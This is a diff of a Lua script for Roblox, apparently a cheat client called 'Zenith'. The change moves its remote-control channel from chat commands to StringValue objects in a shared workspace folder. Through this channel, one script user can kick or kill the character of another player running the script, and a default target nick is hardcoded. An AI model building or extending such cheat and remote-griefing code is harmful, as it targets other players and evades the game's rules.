@@ -277,37 +277,39 @@ g.Heartbeat:Connect(function(T)
 end)
 
 -- =====================================================================
--- SISTEMA DE ESCUTA DE COMANDOS REMOTOS (CHAT)
+-- SISTEMA DE SINCRONIZAÇÃO DIRETA (WORKSPACE NETWORK)
 -- =====================================================================
 task.spawn(function()
-    local channels = tcs:FindFirstChild("TextChannels")
-    if channels then
-        local generalChannel = channels:FindFirstChild("RBXGeneral")
-        if generalChannel then
-            generalChannel.OnIncomingMessage = function(message)
-                if message.TextSource then
-                    local sender = h:GetPlayerByUserId(message.TextSource.UserId)
-                    if sender then
-                        local text = message.Text
-                        local alvo, acao, arg = text:match("^!zenithcmd_([%w_]+)_(%w+)_(.*)$")
-                        if alvo and alvo == k.Name then
-                            if acao == "kick" then
-                                k:Kick(arg ~= "" and arg or config.kickMessage)
-                            elseif acao == "kill" then
-                                local char = k.Character
-                                if char then
-                                    local hum = char:FindFirstChildOfClass("Humanoid")
-                                    if hum then
-                                        hum.Health = 0
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end
+    local networkFolder = i:FindFirstChild("ZenithScriptNetwork")
+    if not networkFolder then
+        networkFolder = Instance.new("Folder")
+        networkFolder.Name = "ZenithScriptNetwork"
+        networkFolder.Parent = i
     end
+
+    -- Cria o canal próprio do jogador atual
+    local meuCanal = networkFolder:FindFirstChild(k.Name)
+    if not meuCanal then
+        meuCanal = Instance.new("StringValue")
+        meuCanal.Name = k.Name
+        meuCanal.Value = "IDLE"
+        meuCanal.Parent = networkFolder
+    end
+
+    -- Fica escutando se mandaram comando para este celular
+    meuCanal.Changed:Connect(function(valor)
+        if valor == "KILL" then
+            local char = k.Character
+            if char then
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if hum then hum.Health = 0 end
+            end
+            meuCanal.Value = "IDLE"
+        elseif valor:find("^KICK:") then
+            local msg = valor:gsub("^KICK:", "")
+            k:Kick(msg ~= "" and msg or config.kickMessage)
+        end
+    end)
 end)
 
 local a8=Instance.new(a[12]) a8.Name="ZenithMobileUI" a8.Parent=f a8.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
@@ -553,7 +555,7 @@ d1("Keybind T","Enable/Disable T Key",config.keybindT,function(f3) o=f3 config.k
 addInfoRow("Anti Kick","Auto Rejoin",true)
 
 -- =====================================================================
--- PAINEL DE CONTROLE REMOTO (KICK / KILL SINC RONIZADO + CAIXA DE NICK)
+-- PAINEL DE CONTROLE REMOTO (WORKSPACE NETWORK)
 -- =====================================================================
 do
     local UIS = d
@@ -564,7 +566,7 @@ do
 
     local unlocked = false
     local panelOpen = false
-    local selectedTarget = "e3zo270" -- Já vem com o nick que você pediu de exemplo
+    local selectedTarget = "e3zo270"
 
     local COR_FUNDO = Color3.fromRGB(15, 18, 28)
     local COR_BORDA = Color3.fromRGB(30, 40, 65)
@@ -679,7 +681,7 @@ do
     header.Parent = panel
     header.BackgroundTransparency = 1
     header.Size = UDim2.new(1, 0, 0, 34)
-    newText(header, "CONTROLE REMOTO DE SCRIPT", UDim2.new(0, 10, 0, 5), UDim2.new(0, 220, 0, 14), Enum.Font.GothamBold, COR_BRANCO, 13)
+    newText(header, "CONTROLE REMOTO DIRETO", UDim2.new(0, 10, 0, 5), UDim2.new(0, 220, 0, 14), Enum.Font.GothamBold, COR_BRANCO, 13)
     newText(header, "Gerencie o alvo por nick ou lista", UDim2.new(0, 10, 0, 18), UDim2.new(0, 200, 0, 12), Enum.Font.Gotham, Color3.fromRGB(120, 130, 160), 9)
 
     local panelClose = newButton(panel, "X", UDim2.new(1, -28, 0, 6), UDim2.new(0, 20, 0, 20), Color3.fromRGB(25, 30, 45), 11)
@@ -771,10 +773,19 @@ do
         end
     end)
 
-    local function enviarComandoChat(comandoTexto)
-        local generalChannel = tcs:FindFirstChild("TextChannels") and tcs.TextChannels:FindFirstChild("RBXGeneral")
-        if generalChannel then
-            generalChannel:SendAsync(comandoTexto)
+    local function enviarComandoWorkspace(alvoNome, comandoStr)
+        local netFolder = i:FindFirstChild("ZenithScriptNetwork")
+        if netFolder then
+            local canalAlvo = netFolder:FindFirstChild(alvoNome)
+            if canalAlvo then
+                canalAlvo.Value = comandoStr
+            else
+                -- Se o canal do alvo ainda não carregou, cria na hora
+                local novoCanal = Instance.new("StringValue")
+                novoCanal.Name = alvoNome
+                novoCanal.Value = comandoStr
+                novoCanal.Parent = netFolder
+            end
         end
     end
 
@@ -786,7 +797,7 @@ do
         if selectedTarget == lp.Name then
             lp:Kick(config.kickMessage)
         else
-            enviarComandoChat("!zenithcmd_" .. selectedTarget .. "_kick_" .. config.kickMessage)
+            enviarComandoWorkspace(selectedTarget, "KICK:" .. config.kickMessage)
         end
     end)
 
@@ -802,7 +813,7 @@ do
                 if hum then hum.Health = 0 end
             end
         else
-            enviarComandoChat("!zenithcmd_" .. selectedTarget .. "_kill_none")
+            enviarComandoWorkspace(selectedTarget, "KILL")
         end
     end)
 
